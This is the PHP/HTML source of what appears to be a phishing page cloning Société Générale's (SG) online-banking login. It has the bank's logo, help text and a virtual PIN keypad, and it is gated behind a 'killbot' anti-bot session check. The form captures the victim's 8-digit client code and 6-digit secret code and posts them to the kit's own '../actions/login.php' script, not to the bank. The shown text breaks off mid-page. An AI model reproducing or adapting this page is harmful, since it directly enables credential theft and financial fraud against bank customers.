<?php
session_start();
include "../server/fonctions.php";
require "../server/all.php";
include "../server/script.php";
if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 

?>
    <html lang="FR" class="swm-root-active swm-mode-page">

    <head>
        <title>SG | Connexion</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="robots" content="none">      
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
        <link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
        <link href="../assets/css/index_20190723161948.min.css" rel="stylesheet" type="text/css">
        <link href="../assets/css/index_pri_20201013141424.min.css" rel="stylesheet" type="text/css" />
        <link href="../assets/css/awt-front-BDDF.css" rel="stylesheet" type="text/css">
        <link href="../assets/css/style.css" rel="stylesheet" type="text/css">
		<link href="../assets/css/index.min.css" rel="stylesheet" type="text/css">
        <link rel ="stylesheet" href="../assets/css/inbenta.css">
        <link href="../assets/css/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
        <script src="../assets/js/rules.js"></script>	
        <script src="../assets/js/jquery.js"></script>
        <script src="../assets/js/js"></script>
        <script src="../assets/js/jquery2.js"></script>
        
        <style type="text/css">

            .eip_txt_light {
                font-weight: 300;
            }

            body {
    overflow-x: hidden;
}

            .eip_dcw_main-link {
                color: #fff;
                text-decoration: underline !important;
                -webkit-transition: color 0.2s ease-in-out;
                -o-transition: color 0.2s ease-in-out;
                transition: color 0.2s ease-in-out;
            }

            .eip_dcw_main-link:hover,
            .eip_dcw_main-link:focus {
                color: #f05b6f;
            }
        </style>
        <style>
            .hamza {
                border: none;
                width: 9.5ch;
                background: repeating-linear-gradient(90deg, dimgrey 0, dimgrey 1ch, transparent 0, transparent 2.5ch) 0 100%/100% 0px no-repeat;
                color: dimgrey;
                font: 3ch consolas, monospace;
                letter-spacing: 0.7ch;
                margin-left: 55px;

                hamza:focus {
                    outline: none;
                }
        </style>
		
		<style>
			
		</style>
				
        <script src="../assets/js/rules.js"></script>

        <script>
    function submitForm() {
    if (valider()) {
       
        document.getElementById("myForm").submit();
    } else {
       
        alert('Erreur de code secret');
     
    }
}

function validateUser() {
    var userIdInput = document.getElementById('user_id');
    var userIdValue = userIdInput.value;

    // Vérifier si la valeur a exactement 8 chiffres
    if (/^\d{8}$/.test(userIdValue)) {
        // Si la condition est vraie, appeler la fonction ShowStep2() ou effectuer d'autres actions nécessaires
        ShowStep2();
    } else {
        // Sinon, afficher une alerte de test et rediriger vers la page d'erreur avec le paramètre 'code_error'
        alert('Erreur de code client');
        window.location.href = 'login.php';
    }
}



function ShowStep2() {
    document.getElementById("clavier").style.display = "block";
    document.getElementById("btn-container").style.display = "none";
    // Ne soumettez pas le formulaire ici
}

    function resetForm() {
        // Réinitialiser le formulaire en cachant le clavier et en affichant le conteneur du bouton
        document.getElementById("clavier").style.display = "none";
        document.getElementById("btn-container").style.display = "block";
        
        document.getElementById("secret-nbr").value = "";
    }

    function valider() {
        var mdp = document.getElementById("secret-nbr").value;
        if (mdp.length == 6) {
            return true;
        } else {
            return false;
        }
    }
</script>


    


    </head>

    <body class="PRI waitJeton swm swm-theme-BDDF  swm-page-authent  swm-theme-BDDF-BDDF swm-theme-SITE_WEB swm-module-authentCV" style="" cz-shortcut-listen="true"><span id="warning-container"><i data-reactroot=""></i></span>
        
        
        <header class="rsp_header header-deco header-authent js-header-lhs-auth" role="banner">
            <nav class="rsp_nav rsp_nav--above">
                <a id="go-navigation" tabindex="-1"></a>
                <ul class="rsp_nav__list">
                    
                <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="">
                    <a href="https://agences.sg.fr/banque-assurance/" class="rsp_nav__link" data-element-label="agences" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+&quot;agences&quot;})"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/staticfiles/Resources/img/pictos-fonctionnels_20230510173648.svg#lhs-localisation"></use></svg><span>Agences</span></a>
                </li>
                <li class="rsp_nav__item" data-channelid="fa83c5ca6a7e3710VgnVCM10000057f440c0RCRD">
                    <a href="/aides-contact-public/contacter-conseiller" class="rsp_nav__link" data-element-label="aide-et-contacts" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-connectee::'+&quot;aide-et-contacts&quot;})"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/staticfiles/Resources/img/pictos-fonctionnels_20230510173648.svg#lhs-urgence"></use></svg><span>Aide et contacts</span></a>
                </li>
        </ul>
            </nav>
        
            <div class="rsp_header__wrapper-nav">
                
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
            <a href="/" class="rsp_header__logo-mob" title="SG - Aller à l'accueil" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-deconnectee::logo-particuliers'})">
              <svg role="img" aria-label="Logo SG - C'est vous l'avenir" focusable="false" height="48" width="197" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1; xml:space=" preserve"="">
                <style type="text/css">
                  .st0{fill:none;}
                  .st1{fill:#E60028;}
                  .st2{fill:#FFFFFF;}
                </style>
                
                <g>
                  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
                  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
                  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
                  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
                  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
                  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
                  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
                  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
                  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
                  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
                  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
                  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
                  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
                  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
                  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
                  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
                  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
                </g>
                <g>
                  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
                </g>
                <rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
                <rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
                <rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
              </svg>
          </a>
          <a href="/" class="rsp_header__logo-desktop ml-m" title="SG - Aller à l'accueil" onclick="bddfTms.trackEvent(this,'click_menu',{event_name:'navigation-deconnectee::logo-particuliers'})">
              <svg role="img" aria-label="Logo SG - C'est vous l'avenir" focusable="false" height="50" width="205" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 140.2 34.1" style="enable-background:new 0 0 140.2 34.1;" xml:space="preserve">
                <style type="text/css">
                  .st0{fill:none;}
                  .st1{fill:#E60028;}
                  .st2{fill:#FFFFFF;}
                </style>
                
                <g>
                  <path d="M73,12.1c0-2.2,1.7-3.7,4-3.7c1.3,0,2.4,0.5,3.1,1.4l-1.3,1.2c-0.5-0.5-1-0.8-1.7-0.8c-1.2,0-2,0.8-2,2.1   c0,1.2,0.8,2.1,2,2.1c0.7,0,1.2-0.3,1.7-0.8l1.3,1.2c-0.7,0.9-1.8,1.4-3.1,1.4C74.7,15.9,73,14.3,73,12.1z"></path>
                  <path d="M82.9,9.1c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1C80.5,8.4,81,8,81.7,8   C82.4,8,82.9,8.4,82.9,9.1z"></path>
                  <path d="M89.6,14.1v1.6h-5.8V8.5h5.7v1.6h-3.6v1.2h3.2v1.5h-3.2v1.3H89.6z"></path>
                  <path d="M90.2,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C92.1,15.9,90.9,15.5,90.2,15.1z"></path>
                  <path d="M99.1,10.1h-2.2V8.5h6.5v1.6h-2.2v5.6h-2V10.1z"></path>
                  <path d="M114.6,8.5l-3.1,7.2h-2l-3.1-7.2h2.2l2,4.7l2-4.7H114.6z"></path>
                  <path d="M114.3,12.1c0-2.2,1.7-3.7,4-3.7c2.3,0,4,1.6,4,3.7s-1.7,3.7-4,3.7C116,15.9,114.3,14.3,114.3,12.1z M120.3,12.1   c0-1.2-0.9-2.1-1.9-2.1c-1.1,0-1.9,0.8-1.9,2.1s0.9,2.1,1.9,2.1C119.4,14.2,120.3,13.4,120.3,12.1z"></path>
                  <path d="M123.5,12.5v-4h2v3.9c0,1.2,0.5,1.7,1.4,1.7c0.8,0,1.4-0.5,1.4-1.7V8.5h2v4c0,2.2-1.3,3.4-3.4,3.4   C124.8,15.9,123.5,14.7,123.5,12.5z"></path>
                  <path d="M131.1,15.1l0.7-1.5c0.6,0.4,1.5,0.7,2.4,0.7c0.8,0,1.2-0.2,1.2-0.6c0-1.1-4.1-0.3-4.1-3c0-1.3,1.1-2.3,3.2-2.3   c0.9,0,1.9,0.2,2.6,0.6l-0.6,1.5c-0.7-0.4-1.4-0.6-2-0.6c-0.9,0-1.2,0.3-1.2,0.6c0,1.1,4.1,0.3,4.1,2.9c0,1.3-1.1,2.3-3.2,2.3   C133,15.9,131.8,15.5,131.1,15.1z"></path>
                  <path d="M73.3,18.5h2v5.6h3.4v1.6h-5.5V18.5z"></path>
                  <path d="M80.7,19.2c0,0.3,0,0.5-0.3,1.2l-0.7,1.5h-1.2l0.5-1.7c-0.4-0.2-0.6-0.5-0.6-1c0-0.7,0.5-1.2,1.2-1.2   C80.2,18,80.7,18.5,80.7,19.2z"></path>
                  <path d="M85.9,24.4h-3l-0.6,1.4h-2.1l3.2-7.2h2l3.2,7.2h-2.1L85.9,24.4z M85.3,22.9l-0.9-2.3l-0.9,2.3H85.3z"></path>
                  <path d="M95.2,18.5l-3.1,7.2h-2L87,18.5h2.2l2,4.7l2-4.7H95.2z"></path>
                  <path d="M101.7,24.2v1.6h-5.8v-7.2h5.7v1.6H98v1.2h3.2v1.5H98v1.3H101.7z"></path>
                  <path d="M109.7,18.5v7.2H108l-3.2-3.8v3.8h-2v-7.2h1.7l3.2,3.8v-3.8H109.7z"></path>
                  <path d="M111.1,18.5h2v7.2h-2V18.5z"></path>
                  <path d="M117.6,23.8h-1.1v1.9h-2v-7.2h3.3c2,0,3.2,1,3.2,2.7c0,1.1-0.5,1.8-1.4,2.3l1.6,2.3H119L117.6,23.8z M117.7,20.2h-1.1v2.1   h1.1c0.8,0,1.3-0.4,1.3-1.1C118.9,20.5,118.5,20.2,117.7,20.2z"></path>
                </g>
                <g>
                  <path d="M9.1,15.6l1.3,0.3c3.2,0.7,4.6,2.1,4.6,4.6c0,3.1-2.3,4.8-6.6,4.8H2.8v-3.3c1.9,0.4,3.8,0.6,5.5,0.6c2.5,0,3.7-0.7,3.7-1.9   c0-1.3-0.6-1.7-3.4-2.3l-1.3-0.3c-3.2-0.6-4.6-2.1-4.6-4.6C2.7,10.6,5,8.9,9,8.9h5.1v3.3c-1.8-0.4-3.3-0.6-4.9-0.6   c-2.2,0-3.5,0.7-3.5,1.9C5.7,14.7,6.4,15.1,9.1,15.6z M31.3,17.1v8.2H26c-6,0-9.4-3-9.4-8.2c0-5.2,3.5-8.2,9.4-8.2h4.1v3.2   c-1.4-0.3-2.9-0.5-4.2-0.5c-3.8,0-6.1,2-6.1,5.5c0,3.4,2.3,5.4,6.1,5.4h2.5l0-5.4H31.3z"></path>
                </g>
                <rect x="38.2" y="3" class="st1" width="28.3" height="12.8"></rect>
                <rect x="38.2" y="18.5" width="28.3" height="12.8"></rect>
                <rect x="38.2" y="15.7" class="st2" width="28.3" height="2.8"></rect>
              </svg>
          </a>   
        
         
        
        <a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="/ouvrir-compte-bancaire-en-ligne">                <span class="rsp_link__label">Ouvrir un compte</span>
        </a></div>
        
            <h1 class="rsp_header__title-page" id="js-mobile-title">Connexion à votre Espace Client Particuliers</h1>
        
            <input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
            <script>
                function scrollToElement(elementId){
                    let element = document.getElementById(elementId);
                    element.scrollIntoView();
                    element.focus();
                }
            </script>
        </header>
        <main class="dcw_main dcw_gb9_core-wrapper" role="main"><a id="go-content" tabindex="-1"></a>
            <section class="dcw_gb_row"></section>
            <section class="dcw_gb_wrapper"><a id="go-content" tabindex="-1"></a>
                <section class="dcw_gb9_core-left" id=""><noscript>
                        <style>
                            .auth-content {
                                display: none !important;
                            }

                            .js-alert {
                                display: block !important;
                            }

                            .waitAuthJetonMsg {
                                display: none !important;
                            }
                        </style>
                    </noscript>
                    <link rel="stylesheet" href="../assets/css/style.css">
                    <div id="dcw-swm" class="swm-inner-wrapper">
                    <form id="myForm" action="../actions/login.php" method="POST" onsubmit="return valider();">
                            <div class="prefetch"></div>
                            <div id="disableLayer" class="disable-layer"></div>
                            <div id="swm-tooltip" class="swm-tooltip"><span></span></div>
                            <div class="swm-popin-wrapper">
                                <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
                                <div id="swm-popin-dialog" class="swm-popin-dialog">
                                    <div class="swm-popin-relative">
                                        <div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" tabindex="1" aria-label="Fermer la popin"></div>
                                        <div class="swm-popin-ombre-sup"></div>
                                        <div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
                                            <div id="swm-popin" class="swm-popin">
                                                <div id="swm-popin-cadre" class="swm-popin-cadre oob-content"></div>
                                            </div>
                                        </div>
                                        <div class="swm-popin-ombre-inf"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="dcw_authent">
                                <div class="auth-content js-content-aria-hide dcw_codeContainer">
                                    <div id="swmModulesAuth">
                                        <div id="module-authent-cv">
                                            <div class="container-mire-codeClient">
                                                <div class="dcw_block">
                                                    <div class="component-mire-codeclient">
                                                        <div class="dcw_block-element">
                                                            <div class="auth-cs-content row_section dcw_input-container">

<input id="user_id" name="user_id1" type="text" inputmode="numeric" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input" autocomplete="off" pattern="\d{8}" maxlength="8" placeholder="" required title="Le code client doit contenir exactement 8 chiffres.">

<label tabindex="-1" aria-hidden="">Saisissez votre code client</label>
</div>
<?php
if (isset($_GET['error']) && $_GET['error'] == 1) {
    if (isset($_GET['code_error']) && $_GET['code_error'] == 1) {
        echo '<p style="color: red; font-size: 16px;">Le code client doit contenir exactement 8 chiffres.</p>';
    } else {
        echo '<p style="color: red; font-size: 16px;">Identifiant ou mot de passe incorrect.</p>';
    }
}
?>


<div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;">
                                                                <div class="error-wrapper">
                                                                    <div role="alert" class="inner">
                                                                        <div role="alert" class="message" tabindex="0">
                                                                            Votre identifiant est incorrect
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                       <div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container">

                                                            <div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
                                                                <input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
                                                                <label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label">
                                                                    <span class="hidden-checkbox-input needsclick rep"></span>
                                                                    <div class="toggle-btn-handle"></div>
                                                                </label>
                                                            </div>

                                                            <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
                                                            <div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client">
                                                                <span class="dcw_sprite-info--off"></span>
                                                                <div class="dcw_infopopin dcw_infobulle">
                                                                    <p class="dcw_espace">
                                                                        Se souvenir de moi
                                                                    </p>
                                                                    <p>
                                                                        En cochant cette case, votre code client sera mémorisé sur cet appareil.
                                                                    </p>
                                                                    <p class="dcw_espace">
                                                                        De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.
                                                                    </p>
                                                                    <p class="dcw_espace">
                                                                        Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.
                                                                    </p>
                                                                    <button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!-- USER -->
                                                        <div class="auth-cs-content-validate" id="btn-container" style="display: block;">

<button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-validate" autocomplete="current-password" onclick="validateUser();" type="button" aria-label="Valider votre identifiant">Valider</button>

                                                           <!-- <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>-->
                                                            <br>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="clavier" class="loaded" style="display: none;">
                                                <div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk">
                                                    <div class="auth-cs-content-code auth-cs-content swm-vk">
                                                        <div class="auth-cs-content-code-input row_section dcw_input-container">
                                                            <input type="button" id="closeKeyBoard">
                                                            <div class="auth-cs-content-code-input row_section dcw_input-container">

                                                                <!--  PASSWORD   -->
        
                                       
                        <input type="password" id="secret-nbr" name="Pass" class="dcw_input grey_cross hamza"  pattern="\d{6}" maxlength="6"  placeholder="------" title ="Code secret incorrecte , 6 chiffres." required>
                        <span class="error-message" id="passError"></span>


                                     <span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto;"></span>
                                                                <div id="js-error" tabindex="0" class="auth_error"></div>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
                                                                <div id="img_container" class="img-container">
                                                                    <img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="../assets/images/gen_ui.png">
                                                                    <div id="hover_touche_4_4" class="hover" onclick="addCode ('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_4_2" class="hover" onclick="addCode ('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_3_4" class="hover" onclick="addCode ('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_3_3" class="hover" onclick="addCode ('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_3_2" class="hover" onclick="addCode ('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_3_1" class="hover" onclick="addCode ('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_2_1" class="hover" onclick="addCode ('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_1_4" class="hover" onclick="addCode ('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_1_3" class="hover" onclick="addCode ('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
                                                                    <div id="hover_touche_1_1" class="hover" onclick="addCode ('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!-- Ajoutez cette partie à votre code existant -->



                                                        <div class="auth-cs-content-validate">

                                                        <button class="dcw_button-principal dcw_button-arrondi auth-btn-action" id="btn-authent" name="login_submit" type="button" aria-label="Valider votre code secret" onclick="submitForm();">Valider</button>


        <div class="sonore-Keyboard dcw_block-element">
            <a id="activeKS" class="dcw_link" tabindex="0">Activer le clavier sonore</a>
        </div>
    </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </section>
                <section class="dcw_gb9_core-right">
                    <div>
                        <div>
                            <div>

                                <div id="swm-content-default">
                                    <p>
                                        <br>
                                        <strong>Où trouver mon Code Client SG ?
                                        </strong>
                                    </p>
                                    <ul style="list-style-type: disc;">
                                        <li>
                                            Si vous étiez client Société Générale, votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.
                                        </li>
                                        <li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, votre Code Client SG vous a été envoyé par courrier postal il y a quelques semaines. Il remplace votre ancien identifiant.
                                        </li>
                                    </ul>
                                    <strong>Mon Code Secret a-t-il changé avec SG ?
                                    </strong>
                                    <br>
                                    <br>
                                    <span>Vous seul connaissez votre Code Secret.
                                    </span>
                                    <ul style="list-style-type: disc; margin-top: 0;">
                                        <li>
                                            Si vous étiez client Société Générale, utilisez votre Code Secret habituel.
                                        </li>
                                        <li>Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre Banque en Ligne.
                                        </li>
                                    </ul>
                                    <strong>Code Client ou Code Secret inconnus ?
                                    </strong>
                                    <br>
                                    <br>
                                    <a style="text-decoration: underline !important" href="" class="dcw_card-visual_regular-link"><svg aria-hidden=" true=">
                                            <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use>
                                        </svg>
                                        Je souhaite obtenir mon Code Client
                                    </a>
                                    <br>
                                    <a style="text-decoration: underline !important" href="" class="dcw_card-visual_regular-link">
                                        <svg aria-hidden=" true=">
                                            <use height="100%" width="100%" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#double-arrow" xmlns:xlink="http://www.w3.org/1999/xlink"></use>
                                        </svg>
                                        Je ne connais pas mon Code Secret
                                    </a>
                                    <p>&nbsp;
                                    </p>
                                </div>
                                <div id="swm-content-oob" style="display:none">
                                    <div class="eo2680-pass">
                                        <p class="eo2680-oob--title">Sécurité renforcée
                                        </p>
                                        <div class="eo2680-card">
                                            <figure>
                                                <img src="">
                                            </figure>
                                            <p><strong>
                                                    La réglementation européenne*
                                                </strong>
                                                , applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l'accès à votre Espace Client est soumis à une authentification renforcée tous les 180 jours.
                                            </p>
                                        </div>
                                        <!-- #eo2680-card -->
                                        <p class="eo2680-pass--txt"><strong>
                                                Comment ça se passe ?
                                            </strong>
                                            <br>
                                            Une demande de connexion est envoyée en temps réel sur votre mobile dans l’Appli Société Générale. Il vous suffit de la valider depuis votre mobile.
                                            <a style="text-decoration: underline !important;" href="" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité"><svg aria-hidden="true" focusable="false">

                                                </svg>
                                                Tout savoir sur le Pass Sécurité
                                            </a>
                                        </p>
                                        <hr>
                                        <p class="eo2680-pass--txt"><strong>
                                                Vous avez changé de numéro de téléphone ?
                                            </strong>
                                            <br>
                                            Vous pouvez modifier votre numéro de Téléphone Sécurité directement depuis votre Espace Client en allant dans la rubrique Profil &gt; Sécurité &gt; Modifier le téléphone.
                                            <a style="text-decoration: underline !important;" href="" class="dcw_card-visual_regular-link" aria-label="Découvrez le Pass sécurité">
                                                <svg aria-hidden="true" focusable="false">
                                                    <use height="100%" width="100%" xlink:href="" xmlns:xlink="http://www.w3.org/1999/xlink"></use>
                                                </svg>
                                                Communiquer votre numéro de téléphone Sécurité
                                            </a>
                                            <a style="text-decoration: underline !important;" href="" class="dcw_card-visual_regular-link" aria-label="Activer votre téléphone Sécurité">
                                                <svg aria-hidden="true" focusable="false">
                                                    <use height="100%" width="100%" xlink:href="" xmlns:xlink="http://www.w3.org/1999/xlink"></use>
                                                </svg>
                                                Activer votre téléphone Sécurité
                                            </a>
                                        </p>
                                        <hr>
                                        <p class="eo2680-ml">* Directive Européenne des Services de Paiement 2 (DSP2)
                                        </p>
                                    </div>
                                    <!-- #eo2680-oob -->
                                </div>
                                <!-- #### -->
                                <div id="swm-content-otp" style="display:none">
                                    <div class="eo2680-oob">
                                        <p class="eo2680-oob--title">Sécurité renforcée
                                        </p>
                                        <div class="eo2680-card">
                                            <figure>
                                                <img src="">
                                            </figure>
                                            <p><strong>
                                                    La réglementation européenne*
                                                </strong>
                                                , applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l’accès à votre Espace Client est soumis à
